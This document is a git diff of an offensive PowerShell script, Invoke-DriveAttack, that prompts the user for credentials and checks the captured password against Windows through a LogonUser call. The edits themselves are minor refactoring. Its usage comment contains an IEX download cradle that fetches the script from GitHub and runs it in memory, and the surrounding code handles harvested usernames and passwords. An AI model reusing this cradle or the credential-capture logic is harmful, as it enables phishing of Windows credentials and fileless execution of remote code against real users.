@@ -49,18 +49,16 @@ Function Invoke-DriveAttack
             
             IEX (New-Object net.webclient).downloadstring('https://raw.githubusercontent.com/watson0x90/PowerShell-Scripts/master/Invoke-DriveAttack.ps1'); Invoke-DriveAttack -Drive D -verify $false;
     #>
-    [CmdletBinding()]
+    
     Param
     (
         [Parameter(Mandatory = $true)]
         [string]
         $Drive,
         
-        [Parameter(Mandatory = $false)]
         [int]
         $retries = 3,
         
-        [Parameter(Mandatory = $false)]
         [bool]
         $verify = $true
 
@@ -72,11 +70,19 @@ Function Invoke-DriveAttack
     
     $logonUserWin32 = '[System.Runtime.InteropServices.DllImport("advapi32.dll")] public static extern bool LogonUser(string userName, string domainName, string password, int LogonType, int LogonProvider,ref IntPtr phToken);'
 
-    Add-Type -MemberDefinition $logonUserWin32 -Name NativeMethods -Namespace Win32
+    Add-Type -MemberDefinition $logonUserWin32 -Name NativeMethods -Namespace Win32 -Language CSharpVersion2 
+
  
     function Test-Credentials
     {
-        Param($username,$password,$domain)
+        Param(
+            [string]
+            $username = '',
+            [string]
+            $password = '',
+            [string]
+            $domain = ''
+        )
         [IntPtr]$userToken = [Security.Principal.WindowsIdentity]::GetCurrent().Token
    
         $valid = [Win32.NativeMethods]::LogonUser( $username,$domain,$password, 2, 0, [ref]$userToken)
@@ -118,7 +124,6 @@ Function Invoke-DriveAttack
         $username = $cred.GetNetworkCredential().UserName
         $password = $cred.GetNetworkCredential().Password
         $CurrentDomain = $env:UserDomain
-        $UserCancel = $cred	
         
         if($verify)
         {
@@ -142,7 +147,6 @@ Function Invoke-DriveAttack
             $retryCount++
             if($retryCount -eq $retries)
             {
-                $retryPrompt = Error-BadCredentialsPrompt
                 '[!!] Retry count Reached [!!]'
                 break
             }
